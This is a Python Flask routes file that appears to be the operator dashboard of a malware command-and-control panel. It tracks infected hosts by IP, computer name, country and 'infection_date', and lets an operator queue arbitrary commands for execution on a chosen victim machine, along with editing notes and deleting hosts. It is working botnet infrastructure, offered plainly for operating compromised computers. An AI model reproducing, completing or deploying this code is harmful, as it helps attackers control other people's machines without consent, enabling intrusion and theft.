from flask import render_template, jsonify, request, redirect, url_for
from app.main import bp
from flask_login import login_required
from datetime import datetime
from app.models import Host, Task
from app import db
from app.main.forms import EmptyForm


@bp.route('/', methods=['GET', 'POST'])
@bp.route('/index', methods=['GET', 'POST'])
@login_required
def index():
    """
    Renders dashboard page
    """
    form = EmptyForm()
    return render_template('index.html', title='Home', route="index", form=form)


@bp.route('/ajax-host-list', methods=['GET'])
@login_required
def ajax_host_list():
    """
    Ajax request to render host list table
    """
    date_format = '%d.%m.%Y:%H:%M:%S'
    online_count = Host.query.filter_by(status='Online').count()
    task_count = Task.query.count()
    host_count = Host.query.count()
    data = [
        [
            u.id, u.ip, u.computername, u.country, 
            datetime.strftime(u.last, date_format), 
            datetime.strftime(u.infection_date, date_format), 
            u.notes, 
            f"""<span class="badge badge-success">{u.status}</span>""" if u.status == 'Online' else u.status,
            """<a href="#" class="view" title="View" data-toggle="tooltip">
                    <i class="material-icons"></i>
                </a>
                <a href="#" data-url="{0}" class="edit createEditNotes" title="Edit">
                    <i class="material-icons">
                    </i>
                </a>
                <a href="#" data-url="{1}" class="executeCommand" title="Execute">
                    <i class="material-icons">dangerous</i>
                </a>
                <a href="#" data-url="{2}" class="delete deleteHost" title="Delete">
                    <i class="material-icons"></i>
                </a>""".format(
                    url_for('main.host_notes_create_edit', pk=u.id), 
                    url_for('main.host_execute_command', pk=u.id),
                    url_for('main.host_delete', pk=u.id))
        ] for u in db.session.query(Host).all()]
    response = {
        'data': data, 'online_count': online_count, 'task_count': task_count,
        'host_count': host_count
    }
    return jsonify(response)


@bp.route('/host-delete/<int:pk>', methods=['POST'])
@login_required
def host_delete(pk):
    """
    Delete a host and redirects to dashboard
    """
    form = EmptyForm(request.form)
    if request.method == 'POST' and form.validate():
        obj = Host.query.get(pk)
        db.session.delete(obj)
        db.session.commit()
        return redirect(url_for('main.index'))


@bp.route('/host-notes-create-edit/<int:pk>', methods=['POST'])
@login_required
def host_notes_create_edit(pk):
    """
    Create/Edit host notes and redirects to dashboard
    """
    form = EmptyForm(request.form)
    if request.method == 'POST' and form.validate():
        notes = request.form.get('notes', None)
        obj = Host.query.get(pk)
        obj.notes = notes.strip()
        db.session.commit()
        return redirect(url_for('main.index'))


@bp.route('/host-execute-command/<int:pk>', methods=['POST'])
@login_required
def host_execute_command(pk):
    """
    Execute host command and redirects to dashboard
    """

    form = EmptyForm(request.form)
    if request.method == 'POST' and form.validate():
        command = request.form.get('command', None)
        obj = Host.query.get(pk)
        obj = Task(task_type="command", command=command, guid=obj.guid, status="new")
        db.session.add(obj)
        db.session.commit()
        return redirect(url_for('main.index'))
